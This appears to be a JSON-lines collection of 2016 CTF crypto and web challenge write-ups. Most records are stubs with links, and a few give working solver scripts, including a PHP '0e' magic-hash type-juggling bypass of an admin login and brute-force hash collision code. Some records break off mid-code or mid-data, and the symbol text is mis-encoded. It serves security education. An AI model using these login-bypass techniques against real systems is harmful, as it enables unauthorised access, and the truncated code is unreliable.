return\n        put('%s\\n' % FLAG)\n\n\nclass ReusableTCPServer(ss.ForkingMixIn, ss.TCPServer):\n    allow_reuse_address = True\n\n\nif __name__ == '__main__':\n    HOST, PORT = ('0.0.0.0', 1111)\n    ss.TCPServer.allow_reuse_address = True\n    server = ReusableTCPServer((HOST, PORT), Handler)\n    server.serve_forever()\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\insomnihack-teaser-2016\\crypto\\fridginator-200", "year": "2016", "name": "fridginator-200", "writeup": "# Insomni'hack Teaser CTF 2016 : Fridginator 10k\n\n**Category:** Crypto / Web\n**Points:** 200\n**Author:** clZ\n**Solves:** 52\n**Description:**\n\n> My brother John just bought this high-tech fridge which is all flashy and stuff, but has also added some kind of security mechanism which means I can't steal his food anymore... I'm not sure I can survive much longer without his amazing yoghurts. Can you find a way to steal them for me?\n>\n> The fridge is [here](http://fridge.insomnihack.ch/login?next=/)\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-01-16-insomnihack/crypto_200_fridginator#eng-version)\n* <http://pastebin.com/pHg4erCj>\n* <https://pony7.fr/ctf:public:insomnihack:fridginator_10k>\n* <https://github.com/raccoons-team/ctf/tree/master/2016-01-16-insomnihack-teaser/%5Bcrypto%2Bweb%5Dfridginator-200>\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\internetwache-ctf-2016\\crypto\\bank-90", "year": "2016", "name": "bank-90", "writeup": "# Internetwache CTF 2016 : Bank\n\n**Category:** Crypto\n**Points:** 90\n**Solves:** 79\n**Description:**\n\n> Description: Everyone knows that banks are insecure. This one super secure and only allows only 20 transactions per session. I always wanted a million on my account.\n> \n> \n> Attachment: [crypto90.zip](./crypto90.zip)\n> \n> \n> Service: 188.166.133.53:10061\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* <https://www.xil.se/post/internetwache-2016-crypto90-kbeckmann/>\n* <https://cryptsec.wordpress.com/2016/02/22/internetwache-ctf-write-up-2016-bank-crypto-90/>\n* <https://github.com/raccoons-team/ctf/tree/master/2016-02-20-internetwache-ctf/crypto90>\n* <https://github.com/ernacktob/CTF-Writeups/tree/master/Internetwache-CTF-2016/crypto90>\n* <https://github.com/m-k-S/ctf-writeups/tree/master/internetwache-2016/bank-90>\n* <https://github.com/QuokkaLight/write-ups/blob/master/internetwache-ctf-2016/crypto/crypto90.md>\n* <http://poning.me/2016/03/02/bank/>\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\internetwache-ctf-2016\\crypto\\crypto-pirat-50", "year": "2016", "name": "crypto-pirat-50", "writeup": "# Internetwache CTF 2016 : Crypto-Pirat\n\n**Category:** Crypto\n**Points:** 50\n**Solves:** 35\n**Description:**\n\n> Description: Did the East German Secret Police see a Pirat on the sky? Help me find out! Hint: We had 9 planets from 1930â€“2006... Hint2: Each planet has a number. (There's a table on a well-known website). After that you might be interested in ciphers used by the secret police.\n>\n>\n> Attachment: [crypto50.zip](./crypto50.zip)\n\n## Write-up\n\n**by [LosFuzzys](https://hack.more.systems)**\n\nGiven was a text-file with the following content:\n\n```\n â™†â™€â™‡â™€â™† â™‡â™‡â™€â™†âŠ• â™‡â™€â™‡â™€â™† â™‡â™†â™‡â™†âŠ• â™†â™‡â™†â™‡â™‡ â™€â™†â™‡â™†âŠ• â™†â™‡â™†â™‡â™† â™‡â™†â™‡â™†âŠ• â™†â™‡â™‡â™€â™‡ â™€â™†âŠ•â™‡â™€ â™†âŠ•â™‡â™€â™† âŠ•â™†â™‡â™†â™‡\n â™‡â™€â™†â™‡â™† âŠ•â™‡â™€â™‡â™€ â™†âŠ•â™†â™‡â™† â™‡â™†â™‡â™‡â™€ â™†âŠ•â™†â™‡â™† â™‡â™†â™‡â™†âŠ• â™†â™‡â™†â™‡â™† â™‡â™†âŠ•â™‡â™€ â™†â™‡â™‡â™€â™† â™‡â™†âŠ•â™‡â™€ â™†â™‡â™†â™‡â™‡ â™€â™†âŠ•â™†â™‡\n â™†â™‡â™‡â™€â™‡ â™€â™‡â™€â™†âŠ• â™†â™‡â™†â™‡â™‡ â™€â™†âŠ•â™‡â™€ â™‡â™€â™†â™‡â™† âŠ•â™†â™‡â™‡â™€ â™†âŠ•â™‡â™€â™† â™‡â™‡â™€â™‡â™€ â™†âŠ•â™†â™‡â™† â™‡â™†â™‡â™†â™‡ â™†âŠ•â™‡â™€â™† â™‡â™‡â™€â™†â™‡\n â™†âŠ•â™‡â™€â™† â™‡â™†â™‡â™‡â™€ â™†âŠ•â™†â™‡â™† â™‡â™‡â™€â™‡â™€ â™‡â™€â™†âŠ•â™‡ â™€â™†â™‡â™†â™‡ â™†âŠ•â™‡â™€â™‡ â™€â™‡â™€â™†âŠ• â™‡â™€â™‡â™€â™† â™‡â™†â™‡â™†âŠ• â™†â™‡â™†â™‡â™† â™‡â™†âŠ•â™†â™‡\n â™‡â™€â™‡â™€â™† âŠ•â™†â™‡â™†â™‡ â™†â™‡â™†â™‡â™‡ â™€â™†âŠ•â™‡â™€ â™‡â™€â™†â™‡â™† â™‡â™†âŠ•â™†â™‡ â™†â™‡â™†â™‡â™‡ â™€â™‡â™€â™†âŠ• â™†â™‡â™†â™‡â™† â™‡â™†âŠ•â™†â™‡ â™‡â™€â™†â™‡â™† â™‡â™†âŠ•â™†â™‡\n â™†â™‡â™†â™‡â™† â™‡â™†â™‡â™†âŠ• â™†â™‡â™‡â™€â™‡ â™€â™†âŠ•â™‡â™€ â™‡â™€â™†â™‡â™† âŠ•â™†â™‡â™†âŠ• â™†â™‡â™†â™‡â™‡ â™€â™‡â™€â™‡â™€ â™†âŠ•â™‡â™€â™† â™‡â™‡â™€â™†â™‡ â™†âŠ•â™‡â™€â™‡ â™€â™†â™‡â™†â™‡\n â™†â™‡â™†âŠ•â™‡ â™€â™†â™‡â™†âŠ• â™‡â™€â™‡â™€â™† â™‡â™†â™‡â™†âŠ• â™†â™‡â™†â™‡â™† â™‡â™†âŠ•â™‡â™€ â™†â™‡â™†â™‡â™‡ â™€â™†âŠ•â™†â™‡ â™†âŠ•â™‡â™€â™‡ â™€â™‡â™€â™†âŠ• â™†â™‡â™‡â™€â™† â™‡â™†âŠ•â™†â™‡\n â™‡â™€â™‡â™€â™‡ â™€â™†âŠ•â™†â™‡ â™‡â™€â™‡â™€â™† â™‡â™†âŠ•â™†â™‡ â™†â™‡â™‡â™€â™† âŠ•â™‡â™€â™†â™‡ â™†â™‡â™†â™‡â™‡ â™€â™†âŠ•â™‡â™€ â™†â™‡â™†â™‡â™† â™‡â™‡â™€â™†âŠ• â™‡â™€â™†â™‡â™† â™‡â™†â™‡â™‡â™€\n â™†âŠ•â™‡â™€â™† â™‡â™†â™‡â™†â™‡ â™‡â™€â™†âŠ•â™‡ â™€â™†â™‡â™†â™‡ â™†â™‡â™‡â™€â™† âŠ•â™‡â™€â™†â™‡ â™†â™‡â™†â™‡â™‡ â™€\n```\nSince all this symbols represent symbols of planets, we mapped all of them to their corresponding planet-number (see [Wikipedia](https://en.wikipedia.org/wiki/Planet#/media/File:Mercury_symbol.svg)):\n\n* â™† - Neptun ... planet 8\n* â™‡ - Pluto  ... planet 9\n* â™€ - Venus   ... planet 2\n* âŠ• - Earth ... planet 3\n\nThis gave us the following numbers:\n\n```\n 82928 99283 92928 98983 89899 28983 89898 98983 89929 28392 83928 38989 92898 39292 83898 98992\n 83898 98983 89898 98392 89928 98392 89899 28389 89929 29283 89899 28392 92898 38992 83928 99292\n 83898 98989 83928 99289 83928 98992 83898 99292 92839 28989 83929 29283 92928 98983 89898 98389\n 92928 38989 89899 28392 92898 98389 89899 29283 89898 98389 92898 98389 89898 98983 89929 28392\n 92898 38983 89899 29292 83928 992"}
{"source": "write-ups-2016", "category": "Hash", "path": "data\\write-ups-2016\\internetwache-ctf-2016\\crypto\\hashdesigner-70", "year": "2016", "name": "hashdesigner-70", "writeup": "# Internetwache CTF 2016 : Hashdesigner\n\n**Category:** Crypto\n**Points:** 70\n**Solves:** 68\n**Description:**\n\n> Description: There was this student hash design contest. All submissions were crap, but had promised to use the winning algorithm for our important school safe. We hashed our password and got '00006800007d'. Brute force isn't effective anymore and the hash algorithm had to be collision-resistant, so we're good to go, aren't we?\n>\n>\n> Attachment: [crypto70.zip](./crypto70.zip)\n>\n>\n> Service: 188.166.133.53:10009\n\n\n## Write-up\n\nWriteup by [unicornsasfuel](https://github.com/unicornsasfuel)\n\nWe are presented with a custom hash algorithm, one which, upon playing with it, results in a lot of collisions through pure brute force attempts. Contrary to the description, which suggests that neither brute force nor collisions will be effective, this is a very viable route to the solution.\n\nUpon connecting to the service, we are asked for a proof-of-work:\n\n~~~\n$ ncat 188.166.133.53 10009\nYou need to provide your proof of work: A sha1 hash with the last two bytes set to 0. It has 40159607 as the prefix. It should match ^[0-9a-z]{15}$\nEnter work:\n~~~\n\nWe can generate the proof-of-work through brute force with the following python script:\n\n~~~python\nimport sha\nimport sys\nimport itertools\nimport string\n\nprefix = sys.argv[1]\n\nfor combo in itertools.combinations_with_replacement(string.lowercase+string.digits,15-len(prefix)):\n   if sha.new(prefix + ''.join(combo)).hexdigest()[-4:] == '0000':\n      print sha.new(prefix  + ''.join(combo)).hexdigest()\n      print prefix + ''.join(combo)\n      break\n~~~\n\nUpon providing the proof of work, we are presented with a password prompt. We know the correct hash is `00006800007d`, so we use a modified version of the custom hash algorithm script to perform the brute force for us. However, the service does not accept any password shorter than 18 characters. Unfortunately, we are only told this restriction exists once we've done a brute force already. We modify our script to try only 18 character passwords:\n\n~~~\n#!/usr/bin/python2\nimport binascii\nimport textwrap\nimport itertools\nimport string\n\ndef tb(s):\n\treturn bin(int(binascii.hexlify(s),32/2)).lstrip(\"0b\")\n\ndef te(s):\n\tp = 2 << 6\n\treturn s + \"0\" * (p-len(s)%p)\n\ndef tk(s):\n\treturn textwrap.wrap(s, 2<<5) #64\n\ndef tj(s):\n\treturn textwrap.wrap(s, 2<<3) #16\n\ndef ti(l):\n\treturn int(l,2)\n\ndef tr(x,y):\n\treturn (x<< y) or (x >> (16-y));\n\ndef th(x):\n\treturn \"{0:#0{1}x}\".format(x,8)\n\ndef tp(x,y):\n\ts = th(x) + th(y)\n\ts = s.replace(\"0x\",\"\")\n\treturn s\n\ndef myhash(text):\n\n\tb = tb(text)\n\n\tp = te(b)\n\n\tbl = tk(p)\n\n\tt11 = 3\n\tq2 = 5\n\n\ttu = [ y**2 for y in range(2<<4>>1)]\n\tto = [2, 7, 8, 2, 5, 3, 7, 8, 9, 4, 11, 13, 5, 8, 14, 15]\n\n\tfor i in bl:\n\t\tt1 = t11\n\t\tt2 = q2\n\n\t\ttl = tj(i)\n\t\ttq = map(ti, tl)\n\n\t\tfor j in range(16):\n\t\t\tif(j >= 12 ):\n\t\t\t\ttz = (tq[0] & tq[1]) | ~tq[2]\n\t\t\telif(j >= 8):\n\t\t\t\ttz = (tq[3] | tq[2])\n\t\t\telif(j >= 4):\n\t\t\t\ttz = (~tq[2] & tq[0]) & (tq[1] | ~tq[0])\n\t\t\telif(j >= 0):\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\internetwache-ctf-2016\\crypto\\oh-bob-60", "year": "2016", "name": "oh-bob-60", "writeup": "# Internetwache CTF 2016 : Oh Bob!\n\n**Category:** Crypto\n**Points:** 60\n**Solves:** 142\n**Description:**\n\n> Description: Alice wants to send Bob a confidential message. They both remember the crypto lecture about RSA. So Bob uses openssl to create key pairs. Finally, Alice encrypts the message with Bob's public keys and sends it to Bob. Clever Eve was able to intercept it. Can you help Eve to decrypt the message?\n>\n>\n> Attachment: [crypto60.zip](./crypto60.zip)\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* <https://www.xil.se/post/internetwache-2016-crypto60-kbeckmann/>\n* <https://github.com/ernacktob/CTF-Writeups/tree/master/Internetwache-CTF-2016/crypto60>\n* <https://eugenekolo.com/blog/internetwache-2016-ctf-writeups/#ohbob>\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/crypto_60)\n* <http://err0r-451.ru/internetwache-crypto-oh-bob-60-pts/>\n* <https://losfuzzys.github.io/writeup/2016/02/20/iwctf2016-oh-bob/>\n* <http://poning.me/2016/03/01/oh-bob/>\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\internetwache-ctf-2016\\crypto\\procrastination-80", "year": "2016", "name": "procrastination-80", "writeup": "# Internetwache CTF 2016 : Procrastination\n\n**Category:** Crypto\n**Points:** 80\n**Solves:** 47\n**Description:**\n\n> Description: Watching videos is fun! Hint: Stegano skills required.\n>\n>\n> Attachment: [crypto80.zip](./crypto80.zip)\n>\n>\n> Service: <https://procrastination.ctf.internetwache.org>\n\nSources: <https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/crypto80/code/website>\n\n## Write-up\n\n**by [LosFuzzys](https://hack.more.systems)**\n\nGiven was a website including a `song.webm` file. Running `mediainfo` got us the hint,\nthat there is a second audio trace inside the file.\nWe used `ffmpeg` to receive the audio file in `wav` format:\n\n```\nffmpeg -i song.webm -map 0:2 out.wav\n```\n\nAfter listening to it, we concluded that it must be some dial-up noise. So we ran some DTMF analysis.\n\n```\nmultimon-ng -t wav -a DTMF out.wav\n```\n\nThis gave us some numbers separated by zeros:\n\n```\n111 127 173 104 122 60 116 63 123 137 127 61 124 110 137 120 110 60 116 63 123\n```\n\nWe knew that it must be something like `IW{..}`.\nSo we looked in the ASCII Table and saw that this must be some OCT representation.\n\n\nSo the flag was `IW{DR0N3S_W1TH_PH0N3S}`.\n\n\n## Other write-ups and resources\n\n* <https://www.xil.se/post/internetwache-2016-crypto-80-arturo182/>\n* [0x90r00t](https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-crypto-80-procrastination-write-up/)\n* <http://losfuzzys.github.io/writeup/2016/02/22/iwctf2016-procrastination/>\n* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Crypto/Crypto80.md>\n* <http://sexyplatypussies.com/writeups/InternetwacheCTF2016/crypto80.txt>\n* <https://blog.amishsecurity.com/-crypto80-procrastination/>\n"}
{"source": "write-ups-2016", "category": "Hash", "path": "data\\write-ups-2016\\internetwache-ctf-2016\\web\\mess-of-hash-50", "year": "2016", "name": "mess-of-hash-50", "writeup": "# Internetwache CTF 2016 : Mess of Hash\n\n**Category:** Web\n**Points:** 50\n**Solves:** 143\n**Description:**\n\n> Description: Students have developed a new admin login technique. I doubt that it's secure, but the hash isn't crackable. I don't know where the problem is...\n>\n>\n> Attachment: [web50.zip](./web50.zip)\n>\n>\n> Service: <https://mess-of-hash.ctf.internetwache.org/>\n\nSources: <https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web50/code>\n\n## Write-up\n\nWriteup by [unicornsasfuel](https://github.com/unicornsasfuel)\n\nPHP is weird. No doubt about it. There are a lot of quirks.\n\nOne of PHP's quirks is that strings will be interpreted as numbers in scientific notation if they are in the right format, specifically <number>e<number>. If such a number starts with `0e`, it is effectively `0`. If two strings match these parameters and are compared through the double-equals operator (which, importantly, allows for type conversion from string to number), they will always match as they are both effectively `0`.\n\nIt is possible for a hashing algorithm to produce such a hash, though the chances are roughly one in 200 million. Through CTF challenge magic, the admin hash `0e408306536730731920197920342119` matches these conditions.\n\n~~~PHP\n<?php\n\n$admin_user = \"pr0_adm1n\";\n$admin_pw = clean_hash(\"0e408306536730731920197920342119\");\n\nfunction clean_hash($hash) {\n    return preg_replace(\"/[^0-9a-f]/\",\"\",$hash);\n}\n\nfunction myhash($str) {\n    return clean_hash(md5(md5($str) . \"SALT\"));\n}\n~~~\n\nThere are published values whose md5 sums match these conditions, but as we can see above, the hashing algorithm is custom, so we must perform our own search. Below is a Python solver script which provides us the password we need:\n\n~~~Python\nimport md5\nimport string\nimport sys\n\ndef do_0e_check(inhash):\n   if inhash[:2] == '0e':\n      print 'hash %s begins with 0e' % inhash\n      if all([char in string.digits for char in inhash[2:]]):\n         return True\n   return False\n\ni = int(sys.argv[1])\nanswer = 0\n\nprint \"Starting cracking process...\"\n\nwhile True:\n   hashcandidate = md5.new(md5.new(str(i)).hexdigest()+'SALT').hexdigest()\n   if do_0e_check(hashcandidate):\n      break\n   else:\n      i += 1\n      if i % 100000 == 0:\n         sys.stdout.write(\"\\rCurrent i value: %s\" % i)\n         sys.stdout.flush()\n\nprint \"Answer found: md5(md5(%s)+'SALT') matches\" % (i)\n~~~\n\nLogging in with username `pr0_adm1n` and the found password results in a successful login and the disclosure of the flag.\n\n## Other write-ups and resources\n\n* <https://forum.xeksec.com/f138/t88657/>\n* <https://www.xil.se/post/internetwache-2016-web-50-simonvik/>\n* <https://eugenekolo.com/blog/internetwache-2016-ctf-writeups/>\n* <https://blog.amishsecurity.com/internetwache-ctf-2016-web50-mess-of-hash/>\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/web_50)\n* <http://pastebin.com/K4xGYGMK>\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\juniors-ctf-2016\\crypto\\all-your-base-are-belong-to-us-500", "year": "2016", "name": "all-your-base-are-belong-to-us-500", "writeup": "# Juniors CTF 2016 : all-your-base-are-belong-to-us-500\n\n**Category:** Crypto\n**Points:** 500\n**Solves:**\n**Description:**\n\n> ![Description Image](all-your-base-are-belong-to-us-desc-0.jpg)\n>\n> \\- Gruncle Stan, where are you going?\n>\n> \\- Guys, I'm going to Las Vegas. Gonna con them into giving me all their money. Haha.\n>\n> \\- Gruncle, Mabel has already been a head while you were away last time. May I take a lead now?\n>\n> \\- As you wish, Dipper. I'll leve you my cash. As I arrive in LA, I'll send you an email with an account number.\n>\n> \\- But Gruncle, how will I know that the message is from you?\n>\n> \\- Ha, McGucket has invented electronic signature. I'll use it. You will have a verification key and I will have a signature key.\n>\n> \\- Ok, Gruncle Stan. I'm going to do it right. Have fun in LA.\n>\n> A few hours later (Gideon is muttering to himself)\n>\n> ![Description Image](all-your-base-are-belong-to-us-desc-1.jpg)\n>\n> \\- Eventually I've got a chance to take Stan's Mystery Shack.\n>\n> \\- I'll steal the money while Dipper will be sending it to Stan.\n>\n> \\- Genious. But how will we do this? Dipper is going to use the bank services.\n>\n> \\- It means that we only have to figure out the way how the money ends up in my hands.\n>\n> \\- I'll fake Stan's message and write in the number of my account. Haha.\n>\n> \\- Yeah, that's genious. But Stan uses McGucket's e-signature. Dipper will instantly realize what is going on.\n>\n> \\- McGucket is so dumb that he used CRC32 insead of regular hash. It'll be dead easy to hack it.\n>\n> \\- But I don't know anything about hashes, keys and cryptography. What am I supposed to do?\n>\n> \\- You can seek for help. It seems I know someone who will attempt to do this.\n>\n> On the next day Gideon captured the message from Stan with an account number. Change the message:\n>\n> ############ BEGIN SIGNED MESSAGE ############\n>\n> send me $ 10,000 to the account 9589234485239\n>\n> ############## BEGIN SIGNATURE ###############\n>\n> 0x64ce88bd59abad6c3f2247f9109bac5d2c1b7d6L\n>\n> 0x5a39c115fef0ff943740a0cbef07a762478520f6L\n>\n> ############# END SIGNED MESSAGE #############\n>\n> Write in Gideon's accout number there: 0102128506010 and dispatch it.\n>\n> You can send a message via [online messager](10.0.212.239:33636)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\juniors-ctf-2016\\crypto\\here-goes-100", "year": "2016", "name": "here-goes-100", "writeup": "# Juniors CTF 2016 : here-goes-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:**\n**Description:**\n\n> ![Description Image](here-goes-desc-0.jpg)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Rawsec](http://rawsec.ml/en/JuniorCTF-2016-recon-Here-goes/)\n* [0xBeefBabe](http://s.id/cPX)\n* [Thund3r](https://thund3rblog.wordpress.com/2016/11/26/junior-ctf-2016-crypto-300p-here-goes/)\n* [SST CTF](https://github.com/SST-CTF/writeups/tree/master/Juniors%20CTF/Here%20goes!)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\juniors-ctf-2016\\crypto\\lets-decrypt-500", "year": "2016", "name": "lets-decrypt-500", "writeup": "# Juniors CTF 2016 : lets-decrypt-500\n\n**Category:** Crypto\n**Points:** 500\n**Solves:**\n**Description:**\n\n> (TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\juniors-ctf-2016\\crypto\\southern-cross-300", "year": "2016", "name": "southern-cross-300", "writeup": "# Juniors CTF 2016 : southern-cross-300\n\n**Category:** Crypto\n**Points:** 300\n**Solves:**\n**Description:**\n\n> - Wow, what's this, Soos?\n>\n>\n> - It's the Confederacy's cipher disk with a help of which southerners encrypted their messages.\n>\n> - How does it work?\n>\n> - Look, Dipper. We need to encode the phrase MABLE EATS SPRINKLES. We don't need any spaces so just delete them. We get MABLEEATSSPRINKLES. Then we have too choose a key. Let it be GRAVITY. And let's go !!!\n>\n>\n> [ctf video](<https://youtu.be/Fpzrs-fcNKM)>\n>\n>\n> You see, we've encrypted the phrase and here it is RBZTXYZJSKZBLQCEN\n>\n> - Cool!\n>\n> - Now I'll encode a famous story and you'll try to decode it. By the way, it's much more interesting to read the whole story over, isn't it?\n>\n> ....\n>\n> - That's complicated. Maybe I have to find a key at first. I'd better look for someone who is able to solve this...\n>\n> - Don't forget to reach to the end of the text! The ending is greatly important.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Jules Tucker](https://github.com/JulesDT/ctfWriteUps/tree/master/Junior%20CTF%202016/Southern%20Cross%20-%20Crypto%20-%20300)\n* [Rawsec](http://rawsec.ml/en/JuniorCTF-2016-crypto-southern-cross/)\n* [SST CTF](https://github.com/SST-CTF/writeups/tree/master/Juniors%20CTF/Southern%20Cross)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\juniors-ctf-2016\\crypto\\webmonkey-500", "year": "2016", "name": "webmonkey-500", "writeup": "# Juniors CTF 2016 : webmonkey-500\n\n**Category:** Crypto\n**Points:** 500\n**Solves:**\n**Description:**\n\n>\n> ![Description Image](webmonkey-desc-0.jpg)\n>\n> - Dipper, stop doing nothing! It's time to be useful.\n>\n> - Yeah, Gruncle Stan. What can I do?\n>\n> - The number of tourists has incredibly fallen. We need a web-site. Nowadays it's impossible to run a business without a web-site.\n>\n> - Okay, Gruncle, I'll make it. Super site. You will be shocked with a number of visitors arriving here!\n>\n> Three days later\n>\n> ![Description Image](webmonkey-desc-1.jpg)\n>\n> - What are you busy with, Dipper?\n>\n> - I'm developing a website for Gruncle, Mabel. Actually I've already made it. It's only left to send it to the provider.\n>\n> - Give me a look... Wow, cool. It even has a flag. But if gnomes find the flag, they may come back. I'm afraid, Dipper.\n>\n> - Don't be scared. Along with the web-site I've developed a super encoding program. I'll encrypt every file so that gnomes won't understand anything.\n>\n>\n> A few hours later in the gnome den\n>\n> ![Description Image](webmonkey-desc-2.jpg)\n>\n> - Hey you, move! Here lies a site. but it's encrypted. You have to find a hidden flag. Otherwise you'll spend your entire life working all days long in our mines. Haha. Get moving.\n>\n> - And don't be stupid. We have a reserve copy.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\juniors-ctf-2016\\web\\crypto-shop-500", "year": "2016", "name": "crypto-shop-500", "writeup": "# Juniors CTF 2016 : crypto-shop-500\n\n**Category:** Crypto\n**Points:** 500\n**Solves:**\n**Description:**\n\n> ![Description Image](crypto-shop-desc-0.jpg)\n>\n> You are extremely lucky! Today we open the first Crypto-shop in Gravity falls <http://10.0.192.235:61741/index.php/> and we even made up crypto-currency - **gravitycoins**!\n>\n> I invite you to take pat in beta-testing. All we have for now is a file...\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [0x90r00t](https://0x90r00t.com/2016/11/29/juniors-ctf-2016-web-500-crypto-shop-write-up/)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\mma-ctf-2nd-2016\\crypto\\backpackers-cipher-easy-mode-200", "year": "2016", "name": "backpackers-cipher-easy-mode-200", "writeup": "# MMA CTF 2nd 2016 : backpackers-cipher-easy-mode-200\n\n**Category:** Crypto\n**Points:** 200 \n**Solves:** 19\n**Description:**\n\n> Decrypt it. [[backpack.7z](./backpack.7z)]([backpack.7z](./backpack.7z))\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\mma-ctf-2nd-2016\\crypto\\backpackers-cipher-extra-mode-450", "year": "2016", "name": "backpackers-cipher-extra-mode-450", "writeup": "# MMA CTF 2nd 2016 : backpackers-cipher-extra-mode-450\n\n**Category:** Crypto\n**Points:** 450 \n**Solves:** 1\n**Description:**\n\n> [[revenge_of_knapsack.7z](./revenge_of_knapsack.7z)]([revenge_of_knapsack.7z](./revenge_of_knapsack.7z))\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\mma-ctf-2nd-2016\\crypto\\esper-180", "year": "2016", "name": "esper-180", "writeup": "# MMA CTF 2nd 2016 : esper-180\n\n**Category:** Crypto\n**Points:** 180\n**Solves:** 30\n**Description:**\n\n> Are you an ESPer?\n>\n>\n> nc cry1.chal.ctf.westerns.tokyo 37992\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [0x90r00t (French)](https://0x90r00t.com/fr/2016/09/08/mma-ctf-2016-crypto-180-esper-write-up/)\n* (Vietnamese) https://quandqn.wordpress.com/2016/09/05/tokyo-westernsmma-ctf-2nd-2016-twin-primes-esper/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\mma-ctf-2nd-2016\\crypto\\neo-saitama-agency-300", "year": "2016", "name": "neo-saitama-agency-300", "writeup": "# MMA CTF 2nd 2016 : neo-saitama-agency-300\n\n**Category:** Crypto\n**Points:** 300 \n**Solves:** 7\n**Description:**\n\n> You have intruded into a router with the secret exploit. Spy out the flag.\n> \n> \n> $ nc cry1.chal.ctf.westerns.tokyo {41534,41535,41536}\n> \n> \n> [[neo_saitama_agency.7z](./neo_saitama_agency.7z)]([neo_saitama_agency.7z](./neo_saitama_agency.7z))\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\mma-ctf-2nd-2016\\crypto\\pinhole-attack-500", "year": "2016", "name": "pinhole-attack-500", "writeup": "# MMA CTF 2nd 2016 : pinhole-attack-500\n\n**Category:** Crypto\n**Points:** 500\n**Solves:** 2\n**Description:**\n\n> Decrypt the cipher text with a pinhole.\n> \n> \n> $ nc cry1.chal.ctf.westerns.tokyo 23464\n> \n> \n> [[pinhole.7z](./pinhole.7z)]([pinhole.7z](./pinhole.7z))\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\mma-ctf-2nd-2016\\crypto\\super-express-100", "year": "2016", "name": "super-express-100", "writeup": "# MMA CTF 2nd 2016 : super-express-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:** 155\n**Description:**\n\n> [[super_express.7z](./super_express.7z)]([super_express.7z](./super_express.7z))\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/ByteBandits/writeups/tree/master/mma-ctf-2016/crypto/super-express/sudhackar\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\mma-ctf-2nd-2016\\crypto\\twin-primes-50", "year": "2016", "name": "twin-primes-50", "writeup": "# MMA CTF 2nd 2016 : twin-primes-50\n\n**Category:** Crypto Warmup\n**Points:** 50\n**Solves:** 183\n**Description:**\n\n> Decrypt it.\n>\n> [[twin-primes.7z](./twin-primes.7z)]([twin-primes.7z](./twin-primes.7z))\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/TeamContagion/CTF-Write-Ups/tree/master/TokyoWesterns-2016/Twin%20Primes\n* [Invulnerable (Russian)](http://countersite.org/articles/cryptography/113-twin-primes-writeup.html)\n* http://hamidx9.ir/solutions/2016/tw_mma_ctf/twin_primes/sol.py\n* http://shpik.tistory.com/71\n* https://github.com/ByteBandits/writeups/tree/master/mma-ctf-2016/crypto/twin-primes/sudhackar\n* http://megabeets.net/twctf-2016-crypto-twin-primes/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\mma-ctf-2nd-2016\\crypto\\vigenere-cipher-200", "year": "2016", "name": "vigenere-cipher-200", "writeup": "# MMA CTF 2nd 2016 : vigenere-cipher-200\n\n**Category:** Crypto\n**Points:** 200\n**Solves:** 30\n**Description:**\n\n> [[vigenere.7z](./vigenere.7z)]([vigenere.7z](./vigenere.7z))\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
